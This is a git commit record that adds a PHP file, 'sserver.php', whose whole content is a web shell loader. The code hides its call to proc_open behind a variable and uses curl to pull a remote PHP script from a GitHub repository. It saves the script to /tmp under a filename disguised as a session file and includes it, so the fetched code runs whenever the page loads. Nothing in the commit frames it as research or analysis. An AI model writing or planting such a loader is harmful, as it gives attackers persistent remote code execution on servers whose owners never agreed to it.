aa13947eff830e1e366843ecf83607fed97c81eb
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-07-23 18:20:38 +0700

    Add files via upload

---
+++ sserver.php
@@ -0,0 +1,26 @@
+
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+function ex($coman, $serlok)
+{
+	$ler = "2>&1";
+	if (!preg_match("/" . $ler . "/i", $coman)) {
+		$coman = $coman . " " . $ler;
+	}
+	$pr = "proc_open";
+	if (function_exists($pr)) {
+		$tod = @$pr($coman, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
+		echo htmlspecialchars(stream_get_contents($crottz[1]));
+	} else {
+		return false;
+	}
+}
+
+$fname = "sess_" . md5("rex") . ".php";
+if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
+    ex("curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/server.php", "/tmp");
+}
+include("/tmp/$fname");
+?>
